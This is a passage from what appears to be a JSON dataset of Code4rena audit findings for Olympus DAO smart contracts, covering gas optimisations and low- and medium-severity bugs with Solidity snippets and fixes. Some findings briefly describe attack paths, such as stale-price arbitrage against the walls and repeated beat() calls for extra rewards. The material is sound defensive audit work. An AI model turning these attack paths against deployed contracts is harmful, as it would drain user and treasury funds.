src/policies/Governance.sol:[105](https://github.com/code-423n4/2022-08-olympus/blob/2a0b515012b4a40076f6eac487f7816aafb8724a/src/policies/Governance.sol#L105), [117](https://github.com/code-423n4/2022-08-olympus/blob/2a0b515012b4a40076f6eac487f7816aafb8724a/src/policies/Governance.sol#L117),\n\n```solidity\n105    mapping(uint256 => bool) public proposalHasBeenActivated; //@note D:3007\n...\n117    mapping(uint256 => mapping(address => bool)) public tokenClaimsForProposal; //@note D:3007\n```\n\n*   src/modules/PRICE.sol:[62](https://github.com/code-423n4/2022-08-olympus/blob/2a0b515012b4a40076f6eac487f7816aafb8724a/src/modules/PRICE.sol#L62)\n\n```solidity\n62     bool public initialized; //@note D:11813\n```\n\n**Expensive method calls**:\n\nIt's just to show which bool is better left in the code\n\n*   src/policies/Operator.sol\n\n```solidity\n63     bool public initialized; //@note D:5808 M:-22036\n...\n66     bool public active; //@note D:-32775 M:-48896\n```\n\n*   src/policies/Heart.sol\n\n```solidity\n33     bool public active; //@note D:-382\n```\n\n*   src/policies/BondCallback.sol\n\n```solidity\n24     mapping(address => mapping(uint256 => bool)) public approvedMarkets; //@note D:-44192\n```\n\n*   src/Kernel.sol\n\n```solidity\n113    bool public isActive; //@note D:20923 M:-247184\n```\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Olympus DAO",
      "source_link": "https://code4rena.com/reports/2022-08-olympus",
      "github_link": "#g-06--using-bools-for-storage-incurs-overhead-6-instances",
      "tags": [],
      "finders": []
    },
    {
      "id": "5144",
      "title": "[G-05] State variables should be cached in stack variables rather than re-reading them from storage",
      "impact": "GAS",
      "content": "\nDeployment Gas Saved: **24 021**<br>\nMethod Call Gas Saved: **614**<br>\n\nSLOADs are expensive (100 gas after the 1st one) compared to MLOADs/MSTOREs (3 gas each). Storage values read multiple times should instead be cached in memory the first time (costing 1 SLOAD) and then read from this cache to avoid multiple SLOADs.\n\n*   src/policies/Heart.sol:[112-113](https://github.com/code-423n4/2022-08-olympus/blob/2a0b515012b4a40076f6eac487f7816aafb8724a/src/policies/Heart.sol#L112-L113)\n\n```solidity\n112        rewardToken.safeTransfer(to_, reward);\n113        emit RewardIssued(to_, reward);\n```\n\nfix:\n\n```solidity\n        uint256 reward = reward;\n        rewardToken.safeTransfer(to_, reward);\n        emit RewardIssued(to_, reward);\n```\n\n*   src/policies/BondCallback.sol:[68-75](https://github.com/code-423n4/2022-08-olympus/blob/2a0b515012b4a40076f6eac487f7816aafb8724a/src/policies/BondCallback.sol#L68-L75)\n\n```solidity\n68         Keycode TRSRY_KEYCODE = TRSRY.KEYCODE();\n69         Keycode MINTR_KEYCODE = MINTR.KEYCODE();\n70\n71         requests = new Permissions[](4);\n72         requests[0] = Permissions(TRSRY_KEYCODE, TRSRY.setApprovalFor.selector);\n73         requests[1] = Permissions(TRSRY_KEYCODE, TRSRY.withdrawReserves.selector);\n74         requests[2] = Permissions(MINTR_KEYCODE, MINTR.mintOhm.selector);\n75         requests[3] = Permissions(MINTR_KEYCODE, MINTR.burnOhm.selector);\n```\n\nfix(similar for other policies):\n\n```solidity\n    OlympusTreasury ltrsry = TRSRY;\n    OlympusMinter lmintr = MINTR;\n    Keycode TRSRY_KEYCODE = ltrsry.KEYCODE();\n    Keycode MINTR_KEYCODE = lmintr.KEYCODE();\n\n    requests = new Permissions[](4);\n\n    requests[0] = Permissions(TRSRY_KEYCODE, ltrsry.setApprovalFor.selector);\n    requests[1] = Permissions(TRSRY_KEYCODE, ltrsry.withdrawReserves.selector);\n    requests[2] = Permissions(MINTR_KEYCODE, lmintr.mintOhm.selector);\n    requests[3] = Permissions(MINTR_KEYCODE, lmintr.burnOhm.selector);\n```\n\n*   src/policies/Governance.sol:[77-79](https://github.com/code-423n4/2022-08-olympus/blob/2a0b515012b4a40076f6eac487f7816aafb8724a/src/policies/Governance.sol#L77-L79)\n\n```solidity\n77         requests = new Permissions[](2);\n78         requests[0] = Permissions(INSTR.KEYCODE(), INSTR.store.selector);\n79         requests[1] = Permissions(VOTES.KEYCODE(), VOTES.transferFrom.selector);\n```\n\n*   src/policies/Operator.sol:[172-185](https://github.com/code-423n4/2022-08-olympus/blob/2a0b515012b4a40076f6eac487f7816aafb8724a/src/policies/Operator.sol#L172-L185)\n\n```solidity\n172        Keycode RANGE_KEYCODE = RANGE.KEYCODE();\n173        Keycode TRSRY_KEYCODE = TRSRY.KEYCODE();\n174        Keycode MINTR_KEYCODE = MINTR.KEYCODE();\n175\n176        requests = new Permissions[](9);\n177        requests[0] = Permissions(RANGE_KEYCODE, RANGE.updateCapacity.selector);\n178        requests[1] = Permissions(RANGE_KEYCODE, RANGE.updateMarket.selector);\n179        requests[2] = Permissions(RANGE_KEYCODE, RANGE.updatePrices.selector);\n180        requests[3] = Permissions(RANGE_KEYCODE, RANGE.regenerate.selector);\n181        requests[4] = Permissions(RANGE_KEYCODE, RANGE.setSpreads.selector);\n182        requests[5] = Permissions(RANGE_KEYCODE, RANGE.setThresholdFactor.selector);\n183        requests[6] = Permissions(TRSRY_KEYCODE, TRSRY.setApprovalFor.selector);\n184        requests[7] = Permissions(MINTR_KEYCODE, MINTR.mintOhm.selector);\n185        requests[8] = Permissions(MINTR_KEYCODE, MINTR.burnOhm.selector);\n```\n\n*   src/policies/PriceConfig.sol:[32-34](https://github.com/code-423n4/2022-08-olympus/blob/2a0b515012b4a40076f6eac487f7816aafb8724a/src/policies/PriceConfig.sol#L32-L34)\n\n```solidity\n32        permissions[0] = Permissions(PRICE.KEYCODE(), PRICE.initialize.selector);\n33        permissions[1] = Permissions(PRICE.KEYCODE(), PRICE.changeMovingAverageDuration.selector);\n34        permissions[2] = Permissions(PRICE.KEYCODE(), PRICE.changeObservationFrequency.selector);\n```\n\n*   src/policies/TreasuryCustodian.sol:[35-39](https://github.com/code-423n4/2022-08-olympus/blob/2a0b515012b4a40076f6eac487f7816aafb8724a/src/policies/TreasuryCustodian.sol#L35-L39)\n\n```solidity\n35        Keycode TRSRY_KEYCODE = TRSRY.KEYCODE();\n36\n37        requests = new Permissions[](2);\n38        requests[0] = Permissions(TRSRY_KEYCODE, TRSRY.setApprovalFor.selector);\n39        requests[1] = Permissions(TRSRY_KEYCODE, TRSRY.setDebt.selector);\n```\n\n*   src/policies/VoterRegistration.sol:[33-35](https://github.com/code-423n4/2022-08-olympus/blob/2a0b515012b4a40076f6eac487f7816aafb8724a/src/policies/VoterRegistration.sol#L34-L35)\n\n```solidity\n33        permissions = new Permissions[](2);\n34        permissions[0] = Permissions(VOTES.KEYCODE(), VOTES.mintTo.selector);\n35        permissions[1] = Permissions(VOTES.KEYCODE(), VOTES.burnFrom.selector);\n```\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Olympus DAO",
      "source_link": "https://code4rena.com/reports/2022-08-olympus",
      "github_link": "#g-05-state-variables-should-be-cached-in-stack-variables-rather-than-re-reading-them-from-storage",
      "tags": [],
      "finders": []
    },
    {
      "id": "5143",
      "title": "[G-04] Use elementary types or a user-defined `type` instead of a `struct` that has only one member (1 instances)",
      "impact": "GAS",
      "content": "\nDeployment Gas Saved: **30 714**<br>\nMethod Call Gas Saved: **1 037**<br>\n\n*   src/modules/RANGE.sol:[33-35](https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/modules/RANGE.sol#L33-L35)\n\n```solidity\n33     struct Line {\n34         uint256 price; // Price for the specified level\n35     }\n```\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Olympus DAO",
      "source_link": "https://code4rena.com/reports/2022-08-olympus",
      "github_link": "#g-04-use-elementary-types-or-a-user-defined-type-instead-of-a-struct-that-has-only-one-member-1-instances",
      "tags": [],
      "finders": []
    },
    {
      "id": "5142",
      "title": "[G-03]  Using `private` rather than `public` for constants, saves gas (8 instances)",
      "impact": "GAS",
      "content": "\nIf needed, the value can be read from the verified contract source code. Savings are due to the compiler not having to create non-payable getter functions for deployment calldata, and not adding another entry to the method ID table\n\nDeployment Gas Saved: **45 857**<br>\nMethod Call Gas Saved: **308**<br>\n\n*   src/policies/Governance.sol:[119-137](https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/policies/Governance.sol#L119-L137)\n\n```solidity\n119    /// @notice The amount of votes a proposer needs in order to submit a proposal as a percentage of total supply (in basis points).\n120    /// @dev    This is set to 1% of the total supply.\n121    uint256 public constant SUBMISSION_REQUIREMENT = 100;\n122\n123    /// @notice Amount of time a submitted proposal has to activate before it expires.\n124    uint256 public constant ACTIVATION_DEADLINE = 2 weeks;\n125\n126    /// @notice Amount of time an activated proposal must stay up before it can be replaced by a new activated proposal.\n127    uint256 public constant GRACE_PERIOD = 1 weeks;\n128\n129    /// @notice Endorsements required to activate a proposal as percentage of total supply.\n130    uint256 public constant ENDORSEMENT_THRESHOLD = 20;\n131\n132    /// @notice Net votes required to execute a proposal on chain as a percentage of total supply.\n133    uint256 public constant EXECUTION_THRESHOLD = 33;\n134\n135    /// @notice Required time for a proposal to be active before it can be executed.\n136    /// @dev    This amount should be greater than 0 to prevent flash loan attacks.\n137    uint256 public constant EXECUTION_TIMELOCK = 3 days;\n```\n\n*   src/policies/Operator.sol:[89](https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/policies/Operator.sol#L89)\n\n```solidity\n89     uint32 public constant FACTOR_SCALE = 1e4;\n```\n\n*   src/modules/RANGE.sol:[65](https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/modules/RANGE.sol#L65)\n\n```solidity\n65     uint256 public constant FACTOR_SCALE = 1e4;\n```\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Olympus DAO",
      "source_link": "https://code4rena.com/reports/2022-08-olympus",
      "github_link": "#g-03--using-private-rather-than-public-for-constants-saves-gas-8-instances",
      "tags": [],
      "finders": []
    },
    {
      "id": "5140",
      "title": "[G-01]  Replace `modifier` with `function` (6 instances)",
      "impact": "GAS",
      "content": "\nModifiers make code more elegant, but cost more than normal functions.\n\nDeployment Gas Saved: **460 154**\n\nAll modifiers except `permissioned` due to unresolved error flow.\n\n*   src/Kernel.sol:[70-73](https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/Kernel.sol#L70-L73), [119-123](https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/Kernel.sol#L119-L123), [223-232](https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/Kernel.sol#L223-L232)\n\n```solidity\n70     modifier onlyKernel() {\n71         if (msg.sender != address(kernel)) revert KernelAdapter_OnlyKernel(msg.sender);\n72         _;\n73     }\n...\n119    modifier onlyRole(bytes32 role_) {\n120        Role role = toRole(role_);\n121        if (!kernel.hasRole(msg.sender, role)) revert Policy_OnlyRole(role);\n122        _;\n123    }\n...\n223    modifier onlyExecutor() {\n224        if (msg.sender != executor) revert Kernel_OnlyExecutor(msg.sender);\n225        _;\n226    }\n227\n228    /// @notice Modifier to check if caller is the roles admin.\n229    modifier onlyAdmin() {\n230        if (msg.sender != admin) revert Kernel_OnlyAdmin(msg.sender);\n231        _;\n232    }\n```\n\n*   src/policies/Operator.sol:[188-191](https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/policies/Operator.sol#L188-L191)\n\n```solidity\n188    modifier onlyWhileActive() {\n189        if (!active) revert Operator_Inactive();\n190        _;\n191    }\n```\n\n*   [src/modules/PRICE.sol](https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/PRICE.sol)\n\n```solidity\nif (!initialized) revert Price_NotInitialized(); // @note 4 instances\n```\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Olympus DAO",
      "source_link": "https://code4rena.com/reports/2022-08-olympus",
      "github_link": "#g-01--replace-modifier-with-function-6-instances",
      "tags": [],
      "finders": []
    },
    {
      "id": "5139",
      "title": "[L-09] Heart: if the issueReward fails the heart beat will revert",
      "impact": "LOW",
      "content": "\n*   <https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/policies/Heart.sol#L106>\n\nIf the `_issueReward` reverts, for example, because the token balance is too low, the `beat` will as well revert, due to the `safeTransfer`. One might consider not to revert even in the case the `_issueReward` reverts.\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Olympus DAO",
      "source_link": "https://code4rena.com/reports/2022-08-olympus",
      "github_link": "#l-09-heart-if-the-issuereward-fails-the-heart-beat-will-revert",
      "tags": [],
      "finders": []
    },
    {
      "id": "5138",
      "title": "[L-08] BondCallback, Operator: upon module's upgrade, the token approval should be revoked",
      "impact": "LOW",
      "content": "\n*   <https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/policies/BondCallback.sol#L57>\n*   <https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/policies/Operator.sol#L167>\n\nThe `BondCallback` and `Operator` approves ohm to the `MINTR` module in the `configureDependencies`. However, there is no logic to revoke those approvals (e.i. approve to zero). In the case of the `MINTR` has some bugs, it may be desirable to be able to revoke the approvals.\n\n```solidity\n// Operator::configureDependencies\n167         ohm.safeApprove(address(MINTR), type(uint256).max);\n```\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Olympus DAO",
      "source_link": "https://code4rena.com/reports/2022-08-olympus",
      "github_link": "#l-08-bondcallback-operator-upon-modules-upgrade-the-token-approval-should-be-revoked",
      "tags": [],
      "finders": []
    },
    {
      "id": "5137",
      "title": "[L-07] Kernel: misplaced zero address check for `changeKernel`",
      "impact": "LOW",
      "content": "\n*   <https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/Kernel.sol#L76-L78>\n*   <https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/Kernel.sol#L254-L257>\n\nCurrently, the check for the `Kernel` to be a contract (also not to be the zero address), is in the current `Kernel` implementation. However, no modules and policies have the logic to ensure this as they inherit from `KernelAdapter`, which will just set the new kernel without a question. This will work well as long as the new Kernel has the similar logic to check the next Kernel's integrity. However, if the logic is forgotten, there is no other safe guard to ensure that the next kernel is not a zero address and is a contract.\nSince `Kernel` is absolutely needed for this system's functionality, there is no possible case that the Kernel should be the zero address. Therefore, it is probably safe to add the checking logic to the `KernelAdapter`, so every module and policy will check for the next Kernel. It costs more gas since the check is done multiple times, but still arguably it is worth the cost, since Kernel is core part of the system and it will not updated very often.\n\n```solidity\n// KernelAdapter::changeKernel\n 76     function changeKernel(Kernel newKernel_) external onlyKernel {\n 77         kernel = newKernel_;\n 78     }\n\n// Kernel::executeAction\n254         } else if (action_ == Actions.MigrateKernel) {\n255             ensureContract(target_);\n256             _migrateKernel(Kernel(target_));\n257         }\n```\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Olympus DAO",
      "source_link": "https://code4rena.com/reports/2022-08-olympus",
      "github_link": "#l-07-kernel-misplaced-zero-address-check-for-changekernel",
      "tags": [],
      "finders": []
    },
    {
      "id": "5136",
      "title": "[L-06] Operator: missing check for configParmas\\[0] (cushionFactor) in the constructor",
      "impact": "LOW",
      "content": "\n*   <https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/policies/Operator.sol#L92-L150>\n*   <https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/policies/Operator.sol#L516-L524>\n\nThe `Operator::constructor` does not check the condition of the `cushionFactor`. Below is the condition for the `cushionFactor` checked in the `Operator::setCushionFactor`.\n\n```solidity\n// Operator::setCushionFactor\n\n516     function setCushionFactor(uint32 cushionFactor_) external onlyRole(\"operator_policy\") {\n517         /// Confirm factor is within allowed values\n518         if (cushionFactor_ > 10000 || cushionFactor_ < 100) revert Operator_InvalidParams();\n519\n520         /// Set factor\n521         _config.cushionFactor = cushionFactor_;\n522\n523         emit CushionFactorChanged(cushionFactor_);\n524     }\n```\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Olympus DAO",
      "source_link": "https://code4rena.com/reports/2022-08-olympus",
      "github_link": "#l-06-operator-missing-check-for-configparmas0-cushionfactor-in-the-constructor",
      "tags": [],
      "finders": []
    },
    {
      "id": "5135",
      "title": "[L-05] BondCallback: operator is not set `constructor`",
      "impact": "LOW",
      "content": "\n*   <https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/policies/BondCallback.sol#L38-L45>\n\nIf the `operator` is not set, the `callback` function will revert so, it is crucial to set the `operator` before any operation. However, it was not set in the `constructor`, but should be set separately by calling `setOperator`.\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Olympus DAO",
      "source_link": "https://code4rena.com/reports/2022-08-olympus",
      "github_link": "#l-05-bondcallback-operator-is-not-set-constructor",
      "tags": [],
      "finders": []
    },
    {
      "id": "5134",
      "title": "[L-04] Operator: unsafe cast for decimals",
      "impact": "LOW",
      "content": "\n*   <https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/policies/Operator.sol#L372>\n*   <https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/policies/Operator.sol#L427>\n*   <https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/policies/Operator.sol#L431-L434>\n*   <https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/policies/Operator.sol#L375-L379>\n\nIn the `Operator::_activate` decimal values were casted to `int8` and `uint8` back and forth. Since there is no check, those values can potentially overflow/underflow. However, if it happens the exponent in the line 376 will like to revert due to too large numbers. Besides, if the price decimals are that big, this may not be the biggest problem to face.\n\n```solidity\n// policies/Operator.sol::_activate\n\n372             int8 scaleAdjustment = int8(ohmDecimals) - int8(reserveDecimals) + (priceDecimals / 2);\n\n375             uint256 oracleScale = 10**uint8(int8(PRICE.decimals()) - priceDecimals);\n376             uint256 bondScale = 10 **\n377                 uint8(\n378                     36 + scaleAdjustment + int8(reserveDecimals) - int8(ohmDecimals) - priceDecimals\n379                 );\n```\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Olympus DAO",
      "source_link": "https://code4rena.com/reports/2022-08-olympus",
      "github_link": "#l-04-operator-unsafe-cast-for-decimals",
      "tags": [],
      "finders": []
    },
    {
      "id": "5133",
      "title": "[L-03] PRICE: unsafe cast for `numObservations`",
      "impact": "LOW",
      "content": "\n*   <https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/modules/PRICE.sol#L97>\n*   <https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/modules/PRICE.sol#L249-L257>\n*   <https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/modules/PRICE.sol#L281-L289>\n\nThe `movingAverageDuration` and `observationFrequency` are uint48. So `movingAverageDuration / observationFrequency` may overflow when casted to uint32. In the below snippet, line 281, the array will be set based on the uint256 value, but the `numObservations` is casted down to uint32. It may result in different `numObservations` and the length of `observations` array.\nHowever, given the large numbers, the attempt to set such a large number as the parameters will likely to fail with \"out of gas\" error, since the length of the array `observations` is ridiculously large in this case. Yet, it is probably safe to set some upper limit for the `numObservations` or use safeCast.\n\n```solidity\n// modules/PRICE::constructor\n  97         numObservations = uint32(movingAverageDuration_ / observationFrequency_);\n\n// modules/PRICE::changeObservationFrequency\n  280         // Store blank observations array of new size\n  281         observations = new uint256[](newObservations);\n  282\n  283         // Set initialized to false and update state variables\n  284         initialized = false;\n  285         lastObservationTime = 0;\n  286         _movingAverage = 0;\n  287         nextObsIndex = 0;\n  288         observationFrequency = observationFrequency_;\n  289         numObservations = uint32(newObservations);\n```\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Olympus DAO",
      "source_link": "https://code4rena.com/reports/2022-08-olympus",
      "github_link": "#l-03-price-unsafe-cast-for-numobservations",
      "tags": [],
      "finders": []
    },
    {
      "id": "5132",
      "title": "[L-02] BondCallback: incorrect accounting if quoteToken is rebase token",
      "impact": "LOW",
      "content": "\n*   <https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/policies/BondCallback.sol#L114>\n\nIf the quoteToken is rebase token, the priorBalances may change due to rebasing or airdrop. It may result to an incorrect accounting. However, whether it is exploitable depends on the Bond market's logic.<br>\nWith the current logic, it just checks whether the balance is increased more than the `inputAmount_`, so it is harder to exploit, compare to the alternative logic of using the difference in balances as the input amount. However, it also introduces the possibility of paying the users less than they deserve.\n\n```solidity\n// Callback::callback\n113         // Check that quoteTokens were transferred prior to the call\n114         if (quoteToken.balanceOf(address(this)) < priorBalances[quoteToken] + inputAmount_)\n115             revert Callback_TokensNotReceived();\n```\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Olympus DAO",
      "source_link": "https://code4rena.com/reports/2022-08-olympus",
      "github_link": "#l-02-bondcallback-incorrect-accounting-if-quotetoken-is-rebase-token",
      "tags": [],
      "finders": []
    },
    {
      "id": "5131",
      "title": "[L-01] Operator: incorrect accounting for fee-on-transfer reserve token",
      "impact": "LOW",
      "content": "\n*   <https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/policies/Operator.sol#L330>\n\nIf the reserve token is fee-to-transfer token and the user is buying ohm, the `Operator::swap` will incorrectly assume the `amountIn_` value is transferred, which fails to consider the fees. If the fee is rounded up, the attacker can purchase ohm without giving any assets to the treasury. It may not be profitable for the attacker, but it may cause devaluing of the ohm. However, the loss will be limited to the capacity.\n\n```solidity\n// Operator::swap\n// if(tokenIn_ == reserve) : buying ohm\n329             /// Transfer reserves to treasury\n330             reserve.safeTransferFrom(msg.sender, address(TRSRY), amountIn_);\n```\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Olympus DAO",
      "source_link": "https://code4rena.com/reports/2022-08-olympus",
      "github_link": "#l-01-operator-incorrect-accounting-for-fee-on-transfer-reserve-token",
      "tags": [],
      "finders": []
    },
    {
      "id": "3236",
      "title": "[M-32] Admin cannot be changed to EOA after deployment",
      "impact": "MEDIUM",
      "content": "_Submitted by Jeiwan, also found by datapunk_\n\nAfter contracts are deployed and initialized, the admin address in `Kernel` contract can only be set to a contract. Granting and revoking roles will be possible to do only via a contract, which looks like an unintended behavior since these operations cannot be performed via governance (the governance contract is designed to be the only executor).\n\n### Proof of Concept\n\nAdmin address can be changed to any address (EOA or contract) in the `executeAction` function in `Kernel`:<br>\n<https://github.com/code-423n4/2022-08-olympus/blob/main/src/Kernel.sol#L252-L253>\n\nThis piece explicitly allows EOA addresses since the other actions in the function (besides `ChangeExecutor`) are checked to have only a contract as the target (see `ensureContract` function calls in the other actions). This, and the fact that roles cannot be managed via governance, leads to the conclusion that an admin is designed to be an EOA.\n\nHowever, in the `store` function in `INSTR`, action target can only be a contract:<br>\n<https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/INSTR.sol#L52>\n\nAfter the contracts are deployed, `INSTR` will be the only contract that's allowed to call `Kernel.executeAction`:<br>\n<https://github.com/code-423n4/2022-08-olympus/blob/main/src/scripts/Deploy.sol#L220>\n\nThus, there will be no way to change admin to an EOA. If admin needs to be an EOA, the `INSTR` contract needs to be patched and re-deployed to allow non-contract targets.\n\n### Recommended Mitigation Steps\n\nAllow EOA addresses as instruction targets or disallow non-contract admin addresses.\n\n**[fullyallocated (Olympus) confirmed and commented](https://github.com/code-423n4/2022-08-olympus-findings/issues/94#issuecomment-1234801408):**\n > Nice find + writeup.\n\n\n\n***\n\n",
      "summary": "\nThis bug report is about a vulnerability in the code of a contract deployment. The vulnerability is that after contracts are deployed and initialized, the admin address in the 'Kernel' contract can only be set to a contract. This means that granting and revoking roles can only be done through a contract, which is an unintended behavior since these operations should be done through governance. The bug can be exploited by changing the admin address to any address (EOA or contract) in the 'executeAction' function in 'Kernel'. To fix the vulnerability, the recommended mitigation steps are to either allow EOA addresses as instruction targets or disallow non-contract admin addresses.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Olympus DAO",
      "source_link": "https://code4rena.com/reports/2022-08-olympus",
      "github_link": "https://github.com/code-423n4/2022-08-olympus-findings/issues/94",
      "tags": [],
      "finders": [
        "Jeiwan",
        "datapunk"
      ]
    },
    {
      "id": "3235",
      "title": "[M-31] Protocol's Walls / cushion bonds remain active even if heart is not beating",
      "impact": "MEDIUM",
      "content": "_Submitted by Trust_\n\n<https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/policies/Operator.sol#L188-L191><br>\n<https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Operator.sol#L272><br>\n<https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/policies/Operator.sol#L346><br>\n\nThe Walls of the RBS mechanism offer zero slippage swaps at the high and low of the moving average spread. The capacity to be swapped at these prices is usually very large, so it must make sure to only be enabled when the prices are guaranteed to be synced. However, there is no such check. If beat() is not called for some time, meaning we cannot determine if the current spread is legit, swap() still operates as usual.\n\n### Impact\n\nThe worst case scenario is that the wall is swapping at a losing price, meaning they can be immediately drained via arbitrage bot.\n\n### Proof of concept\n\n    1. Price is X at the start\n    2. Oracle stops updating for some reason / no one calls beat()\n    3. Price drops to Y , where Y < low wall centered around X\n    4. Attacker can perform arbitrage by buying Ohm at external markets at Y and selling Ohm at low wall price, netting the difference.\n\n### Recommended mitigation steps:\n\nChange modifier onlyWhileActive to add a check for beat out of sync:\n\n    if (block.timestamp > lastBeat + SYNC_THRESHOLD * frequency())\n\n**[Oighty (Olympus) confirmed and commented](https://github.com/code-423n4/2022-08-olympus-findings/issues/89#issuecomment-1238784898):**\n > This is an interesting unintended consequence of a bad price feed or other `beat()` issue. Your suggested update makes sense, but we will probably adjust slightly to only manage the bad data threshold in one place. \n> \n> After originally looking at it, I thought a try/catch block on the external call to `PRICE.getLastPrice()` in `Operator.operate()` would work, but it doesn't handle cases where `operate()` isn't reached by the `beat()` function.\n\n\n\n***\n\n",
      "summary": "\nThis bug report is about a vulnerability in the RBS mechanism of the code-423n4/2022-08-olympus repository. This mechanism offers zero slippage swaps at the high and low of the moving average spread, but there is no check to ensure that the current spread is legitimate. If the Oracle stops updating or beat() isn't called for some time, the swap() can still operate as usual, leading to a worst case scenario where the wall is swapping at a losing price and can be immediately drained via an arbitrage bot. To prove this concept, a scenario is listed where the price drops below the low wall centered around the original price. \n\nThe recommended mitigation step is to change the modifier onlyWhileActive to add a check for beat out of sync. This check should be a comparison of the current block timestamp and the lastBeat timestamp, plus a SYNC_THRESHOLD multiplied by the frequency. This will ensure that the swap() is only enabled when the prices are guaranteed to be synced.",
      "quality_score": 4,
      "rarity_score": 3,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Olympus DAO",
      "source_link": "https://code4rena.com/reports/2022-08-olympus",
      "github_link": "https://github.com/code-423n4/2022-08-olympus-findings/issues/89",
      "tags": [
        "Validation",
        "Stale Price"
      ],
      "finders": [
        "Trust"
      ]
    },
    {
      "id": "3234",
      "title": "[M-30] `Heart::beat()` could be called several times in one block if no one called it for a some time",
      "impact": "MEDIUM",
      "content": "_Submitted by rvierdiiev, also found by datapunk, devtooligan, itsmeSTYJ, Jeiwan, Lambda, Trust, and zzzitron_\n\n`beat()` function is allowed to be called by anyone once in `frequency()` period. The purpose of it is to update the prices and do another operations related to bond market. User who ran it are rewarded. There is no need to run this function more then 1 time in `frequency()` period.\nHowever if `beat()` was last time called more then `frequency()` time ago then user can execute `beat()` function `(block.timestamp - lastBeat)/frequency()` times in a row in same block and get rewards.\n\n### Proof of Concept\n\n<https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Heart.sol#L92><br>\n<https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Heart.sol#L103>\n\n### Recommended Mitigation Steps\n\n<https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Heart.sol#L103><br>\nChange this line to `lastBeat = block.timestamp - (block.timestamp - lastBeat) % frequency();`<br>\nSo no matter how much time the `beat()` was not called, it is possible to call it only once per `frequency()`.\n\n**[Oighty (Olympus) confirmed and commented](https://github.com/code-423n4/2022-08-olympus-findings/issues/79#issuecomment-1239882530):**\n > See comment 